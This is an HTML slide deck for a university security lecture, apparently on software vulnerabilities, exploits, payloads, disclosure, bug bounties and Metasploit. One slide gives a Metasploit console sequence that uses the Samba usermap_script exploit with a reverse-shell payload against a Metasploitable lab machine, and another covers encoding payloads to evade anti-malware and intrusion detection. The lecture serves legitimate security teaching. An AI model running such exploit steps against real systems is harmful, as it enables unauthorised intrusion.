@@ -1,0 +1,656 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Program Security: Vulnerabilities</title>
+
+		<meta name="generator" content="AwesomeSlides converter" />
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+		
+		<base target="_blank">
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/cliffe.css" id="theme">
+		<!-- Code syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- If the query includes 'print-pdf', include the PDF print sheet -->
+		<script>
+			if( window.location.search.match( /print-pdf/gi ) ) {
+				var link = document.createElement( 'link' );
+				link.rel = 'stylesheet';
+				link.type = 'text/css';
+				link.href = 'css/print/pdf.css';
+				document.getElementsByTagName( 'head' )[0].appendChild( link );
+			}
+		</script>
+		
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides">
+				<section data-background='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/1000000000000400000002A4F5571A73.png'>
+					<h1>Program Security: Vulnerabilities</h1>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/100000000000012C000000D754A5FAD2.png'>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000001AA000002804110CA6B.png'>
+
+					
+					<img src="images/leeds-beckett/Leeds_Beckett_University_logo_white.png" class="attribution_image" style="height: 70px; position: absolute; top: 600px; right: 1em; background:none; border:none; box-shadow:none; filter: brightness(0) invert(1);" /><p>Z. Cliffe Schreuders</p>
+					<div class="slide_license">
+						<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img class="attribution_image" alt="Creative Commons License" src="images/licenses/CC BY-SA 88x31.png" style="height: 30px; background:none; border:none; box-shadow:none;" /></a>
+  <a rel="license" href="http://www.gnu.org/licenses/agpl.html"><img class="attribution_image" alt="GNU AGPL License" src="images/licenses/agplv3-155x51_white.png" style="height: 30px; background:none; border:none; box-shadow:none;" /></a><br />
+  <span class="ccsa"\>This content and code (including slides CSS, HTML, and JS) by <a href="http://z.cliffe.schreuders.org/" property="cc:attributionName dct:creator" rel="cc:attributionURL">Z. Cliffe Schreuders</a> is dual licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike v4.0 International License</a> and <a rel="license" href="http://www.gnu.org/licenses/agpl.html">GNU Affero General Public License v3</a>.<br /><br /><a href="https://www.youtube.com/c/ZCliffeSchreuders"><img class="attribution_image" alt="YouTube" src="images/logos/YouTube-logo-light.png" style="height: 30px; background:none; border:none; box-shadow:none;"></a><br />Lecture recordings are published on the VLE and <a href="https://www.youtube.com/c/ZCliffeSchreuders">YouTube</a>.
+					</div>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F18A4A92F.png' class='attribution_image'>
+<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F18A4A92F.png' class='attribution_image'>
+
+						<p>by&#160;<a href="http://www.flickr.com/people/phylevn/">&#160;</a><a href="http://www.flickr.com/people/phylevn/">phylevn</a><a href="http://www.imagecodr.org/">&#160;</a></p> <p>by&#160;<a href="http://www.flickr.com/people/ben_salter/">&#160;</a><a href="http://www.flickr.com/people/ben_salter/">Capt' Gorgeous</a><a href="http://www.imagecodr.org/">&#160;</a></p> <p>Slides created using AwesomeSlides converter by <a href="http://z.cliffe.schreuders.org/">Z. Cliffe Schreuders</a></p>
+					</div>
+
+				</section>
+				<section data-background='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000004000000030054AB1188.png'>
+					<h2>Programs behaving badly</h2>
+
+					
+					<ul>
+						<li>Malware: Malicious Software
+					<ul>
+						<li>Author intends for the program to act maliciously</li>
+					</ul></li>
+						<li>Vulnerable software: software with vulnerabilities
+					<ul>
+						<li>Design or implementation bugs can be exploited by attackers</li>
+					</ul></li>
+					</ul>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F6CA6BE44.png' class='attribution_image'>
+
+						<p>by&#160;<a href="http://www.flickr.com/people/salford_ian/">&#160;</a><a href="http://www.flickr.com/people/salford_ian/">Pimlico Badger</a><a href="http://www.imagecodr.org/">&#160;</a></p>
+					</div>
+
+				</section>
+				<section>
+					<h2>Software vulnerabilities</h2>
+
+					
+					<ul>
+						<li>Even when the authors of software are trying to do the right thing, it is easy for a mistake to result in attackers being able to take control of the software</li>
+						<li>When this happens attackers can essentially assume the identity of the vulnerable software</li>
+					</ul>
+
+
+				</section>
+				<section data-background='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/100000000000040000000300CCD2CF71.png'>
+					<h2>Vulnerabilities</h2>
+
+					
+					<ul>
+						<li>A software vulnerability is a weakness in the security of a program
+					<ul>
+						<li>Often due to a design decision mistake,</li>
+						<li>or an implementation mistake</li>
+					</ul></li>
+					</ul>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F18A4A92F.png' class='attribution_image'>
+
+						<p>by&#160;<a href="http://www.flickr.com/people/59937401@N07/">&#160;</a><a href="http://www.flickr.com/people/59937401@N07/">Images_of_Money</a><a href="http://www.imagecodr.org/">&#160;</a></p>
+					</div>
+
+				</section>
+				<section data-background='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/100000000000040000000300E1C00908.png'>
+					<h2>Exploits</h2>
+
+					
+					<ul>
+						<li>An exploit is an action (or piece of software that takes an action) that takes advantage of a vulnerability
+					<ul>
+						<li>For example, causes a buffer overflow or command injection</li>
+						<li>The result is the attacker makes the system perform in ways that are not intentionally authorised</li>
+						<li>For example: arbitrary code execution, changes to databases, or denial of service</li>
+					</ul></li>
+					</ul>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F18A4A92F.png' class='attribution_image'>
+
+						<p>by&#160;<a href="http://www.flickr.com/people/mauroescritor/">&#160;</a><a href="http://www.flickr.com/people/mauroescritor/">MAURO CATEB</a><a href="http://www.imagecodr.org/">&#160;</a></p>
+					</div>
+
+				</section>
+				<section data-background='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/1000000000000800000006941B56447E.png'>
+					<h2>Exploitation</h2>
+
+					
+					<ul>
+						<li>Using an exploit</li>
+					</ul>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F18A4A92F.png' class='attribution_image'>
+
+						<p>by&#160;<a href="http://www.flickr.com/people/63723146@N08/">&#160;</a><a href="http://www.flickr.com/people/63723146@N08/">davidmpacey</a><a href="http://www.imagecodr.org/">&#160;</a></p>
+					</div>
+
+				</section>
+				<section>
+					<h2>Local and remote</h2>
+
+					
+					<ul>
+						<li>Local vulnerabilities require local access in order to exploit the flaw
+					<ul>
+						<li>For example, a flaw in MSWord or Adobe Reader</li>
+					</ul></li>
+						<li>Remote vulnerabilities can be exploited by interacting over a network
+					<ul>
+						<li>For example, a flaw in a Web server</li>
+						<li>Results in Remote Code Execution (RCE)</li>
+					</ul></li>
+					</ul>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F18A4A92F.png' class='attribution_image'>
+
+						<p>by&#160;<a href="http://www.flickr.com/people/mauroescritor/">&#160;</a><a href="http://www.flickr.com/people/mauroescritor/">MAURO CATEB</a><a href="http://www.imagecodr.org/">&#160;</a></p>
+					</div>
+
+				</section>
+				<section data-background='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/100000000000064000000429AB44470E.png'>
+					<h2>Payloads</h2>
+
+					
+					<ul>
+						<li>A payload is the malicious code that is consequently run on the target system, if the exploit is successful</li>
+					</ul>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F6CA6BE44.png' class='attribution_image'>
+
+						<p>by&#160;<a href="http://www.flickr.com/people/chrishunkeler/">&#160;</a><a href="http://www.flickr.com/people/chrishunkeler/">Chris Hunkeler</a><a href="http://www.imagecodr.org/">&#160;</a></p>
+					</div>
+
+				</section>
+				<section data-background='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/100000000000064000000429AB44470E.png'>
+					<h2>Common types of vulnerabilities / payloads</h2>
+
+					
+					<ul>
+						<li>Information leaks</li>
+						<li>Denial of service (DoS)</li>
+						<li>Arbitrary code execution: the attacker can run code/commands
+					<ul>
+						<li>Specific database/shell commands</li>
+						<li>The execution of machine code: <br />For example: shell code (gives the attacker a command prompt), code to add a user to the system, spawn a VNC server, and so on</li>
+					</ul></li>
+					</ul>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F6CA6BE44.png' class='attribution_image'>
+
+						<p>by&#160;<a href="http://www.flickr.com/people/chrishunkeler/">&#160;</a><a href="http://www.flickr.com/people/chrishunkeler/">Chris Hunkeler</a><a href="http://www.imagecodr.org/">&#160;</a></p>
+					</div>
+
+				</section>
+				
+				<section> <!-- Bind shell grouping -->
+				<section>
+					<h2>Bind shell</h2>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000002FC000000FC154AF57C.png'>
+
+					
+					<ul>
+						<li>The attacker connects to the victim</li>
+					</ul>
+
+
+				</section>
+				<section>
+					<h2>Bind shell</h2>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000003140000014749A83CEF.png'>
+
+					
+					<ul>
+						<li>Problem: firewalls</li>
+					</ul>
+
+
+				</section>
+				</section>
+
+				<section>
+					<h2>Reverse shell</h2>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000003150000011403DD5FAD.png'>
+
+					
+					<ul>
+						<li>Solution (for the attacker): reverse shell</li>
+					</ul>
+
+
+				</section>
+				<section data-background='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/1000000000000400000002AB550E0552.png'>
+					<h2>Privilege Escalation</h2>
+
+					
+					<ul>
+						<li>A privilege escalation occurs when an attacker is able to gain elevated access to resources, beyond that which are normally available</li>
+						<li>Vertical privilege escalation
+					<ul>
+						<li>Access to resources for higher privilege users or applications</li>
+					</ul></li>
+						<li>Horizontal privilege escalation
+					<ul>
+						<li>Access to resources for other users or applications</li>
+					</ul></li>
+					</ul>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F18A4A92F.png' class='attribution_image'>
+
+						<p>by&#160;<a href="http://www.flickr.com/people/ojbyrne/">&#160;</a><a href="http://www.flickr.com/people/ojbyrne/">ojbyrne</a><a href="http://www.imagecodr.org/">&#160;</a></p>
+					</div>
+
+				</section>
+				<section>
+					<h2>Window of vulnerability</h2>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000002AB0000040050D3A9ED.png'>
+
+					
+					<ul>
+						<li>The window of vulnerability is the time between when the vulnerability exists in software until an end user's computer is protected
+					<ul>
+						<li>Software has bug</li>
+						<li>Attacker finds bug (may not tell anyone)</li>
+						<li>Software or security vendor finds out about the bug</li>
+						<li>A fix is released</li>
+						<li>The fix is finally applied to the user's computer</li>
+					</ul></li>
+					</ul>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F18A4A92F.png' class='attribution_image'>
+
+						<p>by&#160;<a href="http://www.flickr.com/people/extranoise/">&#160;</a><a href="http://www.flickr.com/people/extranoise/">extranoise</a><a href="http://www.imagecodr.org/">&#160;</a></p>
+					</div>
+
+				</section>
+				<section data-background='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/1000000000000474000003C9B92190E9.png'>
+					<h2>Zero days</h2>
+
+					
+					<ul>
+						<li>A zero day security vulnerability is a new security problem that has been discovered</li>
+						<li>To defend, the vendors have zero days to issue a fix</li>
+					</ul>
+
+
+				</section>
+				<section>
+					<h2>Vulnerability disclosure</h2>
+
+					
+					<ul>
+						<li>The way in which vulnerabilities should be disclosed in a topic of heated debate</li>
+						<li>Responsible disclosure involves first contacting the affected vendors and giving them time to fix the issue, usually with a time limit before going public</li>
+						<li>Full disclosure involves going public with all the technical details of a vulnerability without first giving the vendor an opportunity to fix</li>
+					</ul>
+
+
+				</section>
+				
+				<section> <!-- Vulnerability reward schemes grouping -->
+				<section>
+					<h2>Vulnerability reward schemes..</h2>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/1000020100000708000002BCED3D2635.png'>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/100002010000126400000770F09999DA.png'>
+
+					
+					<ul>
+						<li>Google Vulnerability Rewards Program: $500 to $3133.70 (depending on the severity of the bug) for Google Chromium or certain web service security flaws. Google also pay up to $60000 at some events, for suitable bugs.</li>
+						<li>Others: Mozilla Security Bug Bounty Program ($500-$3000), Facebook ($500), The Internet Bug Bounty (Adobe Flash, Python, Ruby, PHP, Django, Ruby on Rails, Perl, OpenSSL, Nginx, Apache HTTP Server, and Phabricator), many more...</li>
+					</ul>
+
+
+				</section>
+				<section>
+					<h2>Vulnerability reward schemes..</h2>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/100002010000083400000316B5E25AEC.png'>
+
+					
+					<ul>
+						<li>Reward schemes generally require 'responsible disclosure'</li>
+						<li>Facebook:<p>&#8220;Responsible Disclosure Policy</p><p>If you give us a reasonable time to respond to your report before making any information public and make a good faith effort to avoid privacy violations, destruction of data and interruption or degradation of our service during your research, we will not bring any lawsuit against you or ask law enforcement to investigate you.&#8221; </p><p>(As of 2012, http://www.facebook.com/whitehat)</p></li>
+					</ul>
+
+
+				</section>
+				<section>
+					<h2>Vulnerability reward schemes</h2>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000FA0000003A36814F42.jpg'>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000002460000007385FAF8A0.jpg'>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/1000000000000229000000D241486EDD.png'>
+
+					
+					<ul>
+						<li>Others such as TippingPoint, Secunia, and iDefense will pay for exploits against popular vendors</li>
+						<li>For example, TippingPoint protect their customers (using an IPS) and give the vendors time to fix the bug, then later release the technical details</li>
+						<li>Bugcrowd is a crowd-sourced security company, where security researchers sign up to do various security tests, such as looking for vulnerabilities</li>
+					</ul>
+
+
+				</section>
+				</section>
+
+				<section>
+					<h2>Project Zero</h2>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000201000004A8000001B0915C0E45.png'>
+
+					
+					<ul>
+						<li>In 2014 Google started Project Zero</li>
+						<li>Employ many experienced security researchers to look for new vulnerabilities in popular software</li>
+					</ul>
+
+
+				</section>
+				<section>
+					<h2>Auditing and permission</h2>
+
+					
+					<ul>
+						<li>Make sure that you have explicit permission before doing any security testing</li>
+						<li>&#8220;Ethical hacking&#8221;, basically means you have legal permission to do a security audit</li>
+						<li>Doing security testing without written permission is legally dangerous... You don't want to end up in jail...</li>
+						<li>It is more likely to be permitted to test software, rather than services or live servers</li>
+						<li>If in doubt, seek legal advice!</li>
+					</ul>
+
+
+				</section>
+				<section>
+					<h2>Traditional mitigation...</h2>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/1000000000000400000004002F2C3629.png'>
+
+					
+					<ul>
+						<li>Updating:
+					<ul>
+						<li>Keeping software up-to-date so that you have all the vendor-supplied fixes</li>
+					</ul></li>
+						<li>Patching:
+					<ul>
+						<li>Applying changes to software</li>
+						<li>Could be provided by a trusted third party</li>
+						<li>Could be source or binary changes</li>
+					</ul></li>
+					</ul>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F18A4A92F.png' class='attribution_image'>
+
+						<p>by&#160;<a href="http://www.flickr.com/people/studiobeerhorst/">&#160;</a><a href="http://www.flickr.com/people/studiobeerhorst/">{studiobeerhorst}-bbmarie</a><a href="http://www.imagecodr.org/">&#160;</a></p>
+					</div>
+
+				</section>
+				<section>
+					<h2>More mitigation...</h2>
+
+					
+					<ul>
+						<li>Vulnerability analysis scanning:
+					<ul>
+						<li>Checking against databases of known vulnerabilities (automated using tools such as Nessus or manually checking advisories)</li>
+					</ul></li>
+						<li>Individual tools and techniques to mitigate specific types of vulnerabilities &#8211; more about this later</li>
+						<li>Penetration testing...</li>
+					</ul>
+
+
+				</section>
+				<section data-background='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000003B1000001C08C8BE9DE.png'>
+					<h2></h2>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000001D500000135A06183F8.png'>
+
+					
+
+
+				</section>
+				
+				<section> <!-- Metasploit framework (MSF) grouping -->
+				<section>
+					<h2>Metasploit framework (MSF)</h2>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/100000000000012C000000D754A5FAD2.png'>
+
+					
+					<ul>
+						<li>Developed by HD Moore</li>
+						<li>The framework is FOSS, with some proprietory interfaces, now owned by Rapid7</li>
+						<li>Highly modular: can easily combine different exploits and payloads
+					<ul>
+						<li>Much more flexible than the manual method of altering exploits programmed in C</li>
+					</ul></li>
+					</ul>
+
+
+				</section>
+				<section>
+					<h2>Metasploit framework (MSF)</h2>
+
+					
+					<ul>
+						<li>Includes an extensive library of modules
+					<ul>
+						<li>Exploits</li>
+						<li>Payloads</li>
+						<li>Encoding</li>
+						<li>Post-exploitation actions</li>
+					</ul></li>
+					</ul>
+
+
+				</section>
+				</section>
+
+				<section>
+					<h2>MSF exploits</h2>
+
+					
+					<ul>
+						<li>MSF contains over 1000 exploits, including:
+					<ul>
+						<li>OS flaws:
+					<ul>
+						<li>Windows, Linux, Mac, ...</li>
+					</ul></li>
+						<li>Services: 
+					<ul>
+						<li>Apache, IIS, &#8230;</li>
+					</ul></li>
+						<li>Applications: 
+					<ul>
+						<li>Adobe Reader, IE, Firefox, &#8230;</li>
+					</ul></li>
+						<li>Web apps: 
+					<ul>
+						<li>some new support</li>
+					</ul></li>
+					</ul></li>
+					</ul>
+
+
+				</section>
+				<section>
+					<h2>MSF payloads</h2>
+
+					
+					<ul>
+						<li>MSF contains many payloads:
+					<ul>
+						<li># msfpayload -l | less</li>
+					</ul></li>
+						<li>Most target specific platforms</li>
+						<li>bind or reverse shells, VNC, etc</li>
+					</ul>
+
+
+				</section>
+				<section data-background='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/100000000000040000000300765C91ED.png'>
+					<h2>MSF encode</h2>
+
+					
+					<ul>
+						<li>MSF can encode exploits/payloads to avoid detection
+					<ul>
+						<li>Alternative instructions</li>
+						<li>Encrypt instructions, along with decrypt code</li>
+						<li>Similar to how polymorphic viruses avoid detection</li>
+					</ul></li>
+						<li>Can also bind and convert payloads to executables</li>
+						<li>Lots of encoding methods:
+					<ul>
+						<li># msfencode -l</li>
+					</ul></li>
+					</ul>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F18A4A92F.png' class='attribution_image'>
+
+						<p>by&#160;<a href="http://www.flickr.com/people/42244964@N03/">&#160;</a><a href="http://www.flickr.com/people/42244964@N03/">Frank.Vassen</a><a href="http://www.imagecodr.org/">&#160;</a></p>
+					</div>
+
+				</section>
+				<section>
+					<h2>MSF interfaces</h2>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/100002010000039A000000C07975BAC0.png'>
+
+					
+					<ul>
+						<li>Msfcli: command line</li>
+						<li>Msfconsole: console (very powerful)</li>
+						<li>Metasploit Community / Pro: proprietory web interfaces and additional tools</li>
+						<li>Armitage: FOSS GUI</li>
+					</ul>
+
+
+				</section>
+				<section>
+					<h2>Steps of using MSF to exploit</h2>
+
+					
+					<ul>
+						<li>Specify the exploit to use</li>
+						<li>Set options for the exploit (such as the IP address of the computer to attack)</li>
+						<li>Choose a payload (this defines what we end up doing on the compromised system)</li>
+						<li>Optionally choose encoding to evade security monitoring such as anti-malware, intrusion detection systems (IDS), and so on</li>
+						<li>Launch the exploit</li>
+					</ul>
+
+
+				</section>
+				<section>
+					<h2>Example (vs Metasploitable)</h2>
+
+					
+					<ul>
+						<li>&gt; use exploit/multi/samba/usermap_script</li>
+						<li>&gt; show options</li>
+						<li>&gt; set RHOST {Metasploitable-IP-Address}</li>
+						<li>&gt; show payloads</li>
+						<li>&gt; set PAYLOAD cmd/unix/reverse</li>
+						<li>&gt; set LHOST {Your-Kali-IP-Address}</li>
+						<li>&gt; set LPORT {Your-Choice-of-Port}</li>
+						<li>&gt; check</li>
+						<li>&gt; exploit</li>
+					</ul>
+
+
+				</section>
+				<section>
+					<h2>Malware and vulnerabilities</h2>
+					<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/1000000000000400000002AB5CE8FB1C.png'>
+
+					
+					<ul>
+						<li>Discuss: why will the traditional defence techniques that we have discussed fail to constantly protect end users?</li>
+					</ul>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F18A4A92F.png' class='attribution_image'>
+
+						<p>&#160;&#160;by&#160;<a href="http://www.flickr.com/people/marriedbachelor18/">&#160;</a><a href="http://www.flickr.com/people/marriedbachelor18/">Koinos Zoi Photography</a><a href="http://www.imagecodr.org/">&#160;</a></p>
+					</div>
+
+				</section>
+				<section data-background='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/1000000000000400000002A9943FB72B.png'>
+					<h2>Conclusion</h2>
+
+					
+					<ul>
+						<li>Malware and software vulnerabilities are two of the most common computer security threats</li>
+						<li>In both cases attackers are often able to run malicious code in the context of a process running as an end user (or in worst cases the context of kernel code)</li>
+						<li>This can be considered an identity problem, since the program is not necessarily acting for the associated identity and privileges</li>
+					</ul>
+
+					<div class="attribution">
+						<img src='images/DSL_DS_OSPT_Lectures_3_Vulnerabilities/10000000000000500000000F18A4A92F.png' class='attribution_image'>
+
+						<p>by&#160;<a href="http://www.flickr.com/people/miggslives/">&#160;</a><a href="http://www.flickr.com/people/miggslives/">miggslives</a><a href="http://www.imagecodr.org/">&#160;</a></p>
+					</div>
+
+				</section>
+
+
+			</div>
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.js"></script>
+		<script src="js/awesomeslides.js"></script>
+
+		<script>
+
+			awesomify({
+				step: 5, // awesomify roughly every 5th background
+			});
+
+			// Full list of configuration options available at:
+			// https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+				transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+				// Optional reveal.js plugins
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, condition: function() { return !!document.querySelector( 'pre code' ); }, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true },
+					{ src: 'plugin/notes/notes.js', async: true }
+				]
+			});
+		</script>
+
+	</body>
+</html>
+
